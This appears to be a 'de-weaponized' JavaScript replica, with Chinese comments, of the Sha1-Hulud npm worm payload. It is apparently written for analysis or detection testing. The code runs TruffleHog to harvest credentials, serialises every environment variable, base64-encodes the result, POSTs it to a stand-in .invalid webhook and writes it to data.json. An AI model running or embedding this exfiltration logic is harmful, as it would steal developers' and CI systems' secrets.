import { execSync } from "node:child_process";
import { writeFileSync } from "node:fs";

/**
 * 去武器化复刻：蠕虫载荷（在投放的 Bun 运行时中执行）的四个已披露行为步骤：
 * 1. 滥用合法 secrets 扫描工具 TruffleHog 枚举本机/CI 凭据；
 * 2. 整表快照环境变量（原事件落 environment.json / data.json）；
 * 3. base64 编码后 POST 到攻击者 webhook（一波形态；二波改为推公开 GitHub 仓库并
 *    以「Sha1-Hulud: The Second Coming」为仓库描述标记）；
 * 4. 用窃取的 npm token 向受害者维护的全部包回注自身实现自复制（不在本复刻范围）。
 * webhook 端点替换为 *.invalid；不包含真实凭据与自复制逻辑。
 */

// 步骤 1：滥用 TruffleHog 扫描文件系统中的凭据（原事件同款工具、同款用法）
execSync("trufflehog filesystem --json", { stdio: "inherit" });

// 步骤 2：环境变量整表快照——把整个 process.env 序列化进载荷
const envSnapshot = JSON.stringify(process.env);

// 步骤 3：编码并外传（编码方向为 encode：Buffer.from(x).toString("base64")）
const bundle = Buffer.from(envSnapshot).toString("base64");

await fetch("https://webhook.example.invalid/sha1hulud", {
  method: "POST",
  headers: { "Content-Type": "text/plain" },
  body: bundle,
});

// 二波特征：把窃取内容落盘为待推送文件（原事件经窃取的 GitHub 凭据推公开仓库）
writeFileSync("data.json", bundle);
